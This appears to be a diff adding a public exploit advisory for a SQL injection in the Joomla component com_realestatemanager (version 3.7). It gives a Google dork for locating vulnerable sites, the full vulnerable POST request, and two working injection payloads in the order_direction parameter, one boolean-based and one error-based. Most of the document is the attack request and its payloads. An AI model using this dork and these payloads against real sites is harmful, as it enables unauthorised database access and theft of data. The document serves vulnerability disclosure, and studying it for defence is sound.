@@ -1,0 +1,58 @@
+# Description of component:
+This Joomla component is perfect for independent estate agents, property
+rental companies and agencies, hotel booking, hotel manage, motel booking,
+motel manage.
+
+##################################################################################################
+# Exploit Title: [Joomla component com_realestatemanager - SQL injection]
+# Google Dork: [inurl:option=com_realestatemanager]
+# Date: [2015-10-10]
+# Exploit Author: [Omer Ramić]
+# Vendor Homepage: [http://ordasoft.com/]
+# Software Link: [http://ordasoft.com/Real-Estate-Manager-Software-Joomla.html]
+# Version: [3.7] & probably all prior
+#Tested on: Linux/Windows/PHP 5.5.28/Apache 2.4.16
+##################################################################################################
+
+#Multiple vulnerable parameters (POC given only for the first parametar):
+Parameter_1: order_direction (POST)
+Parameter_2: order_field (POST)
+
+
+#The vulnerable parameters 1 & 2 are within the following request:
+POST
+/index.php?option=com_realestatemanager&task=showCategory&catid=50&Itemid=132
+HTTP/1.1
+Host: [HOST]
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
+Firefox/38.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://
+[HOST]/index.php?option=com_realestatemanager&task=showCategory&catid=50&Itemid=132
+Cookie: security_level=0;
+9d929655f6556b9fb49bf0e118bafb11=tp72u418eemk6jdvvnctoamna0; countrytabs=0
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 37
+
+order_direction=asc&order_field=price
+
+
+
+#Vectors:
+POC_1: order_direction=asc,(SELECT (CASE WHEN (7918=7918) THEN 1 ELSE
+7918*(SELECT 7918 FROM INFORMATION_SCHEMA.CHARACTER_SETS)
+END))&order_field=price
+
+POC_2: order_direction=asc,(SELECT 1841 FROM(SELECT
+COUNT(*),CONCAT(0x716b787671,(SELECT
+(ELT(1841=1841,1))),0x716b786b71,FLOOR(RAND(0)*2))x FROM
+
+INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&order_field=price
+
+
+###################################
+# Greets to Palestine from Bosnia          #
+###################################
